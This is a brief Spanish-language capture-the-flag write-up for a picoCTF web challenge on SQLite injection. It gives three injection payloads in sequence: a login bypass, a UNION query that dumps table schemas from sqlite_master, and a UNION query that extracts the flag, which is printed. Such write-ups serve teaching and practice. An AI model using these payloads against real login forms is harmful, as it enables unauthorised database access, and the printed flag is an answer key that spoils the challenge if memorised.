Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:62142/).

Hints: 
SQLiLite

# Solución
Primero ingresar al sitio y hacer login inyectando una instrucción sql en la contraseña asi:
```
' or 1=1;
```
Despues descubrir que tablas hay en la base de datos 
```
' union select sql, 2,3 from sqlite_master;
```
Ya teniendo la estructura de las tablas ingresamos a la que nos interesa donde se encuentra la flag
```
' union select id, flag, 3 from more_table;
```
Asi obtenemos la flag
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
```
